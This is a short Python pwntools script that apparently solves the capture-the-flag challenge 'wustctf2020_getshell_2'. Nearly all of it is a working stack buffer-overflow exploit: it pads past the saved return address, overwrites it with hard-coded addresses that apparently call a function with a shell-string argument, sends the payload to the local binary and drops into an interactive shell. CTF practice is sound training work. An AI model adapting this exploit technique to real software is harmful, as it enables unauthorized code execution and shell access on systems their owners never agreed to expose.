from pwn import *
io = process('./wustctf2020_getshell_2')
buf_stack_addr = 0xffffcea0

payload = b'A'*(0x18+4)+p32(0x08048529)+p32(0x08048670)
io.sendline(payload)
io.interactive()
